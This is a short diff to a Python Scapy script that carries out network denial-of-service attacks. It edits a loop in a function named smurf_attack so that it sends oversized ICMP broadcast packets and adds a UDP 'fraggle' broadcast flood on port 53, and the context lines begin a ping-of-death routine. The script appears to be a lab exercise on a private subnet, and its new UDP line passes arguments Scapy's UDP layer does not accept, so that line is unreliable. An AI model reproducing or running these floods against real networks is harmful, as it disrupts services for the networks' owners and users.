@@ -1,5 +1,5 @@
 #! /usr/bin/python
-from scapy.layers.inet import ICMP, fragment, IP
+from scapy.layers.inet import ICMP, fragment, IP, UDP
 from scapy.layers.l2 import Ether, ARP
 import scapy.all as scapy
 import time
@@ -17,8 +17,9 @@ def smurf_attack():
     while(i < 999):
         i = i+1
         # include
-        send(IP(src="192.168.219.255", dst="192.168.219.255") / ICMP() / "testICMPpacket", count=100)
-
+        #first is smurf, second is fraggle. Smurf may be stopped by router as most routers after 1999 block source broadcast address
+        send(IP(src="192.168.219.255", dst="192.168.219.255" , len = 65507) / ICMP() / "testICMPpacket", count=100);
+        send(UDP(src = "192.168.219.40", dst = "192.168.219.255", sport=53, dport=53,len = 65507))
 def thePingOfDeath():
     ans, unans = sr(IP(dst="192.168.219.0/24") / ICMP(), timeout=3)
     max_data_size = 65535
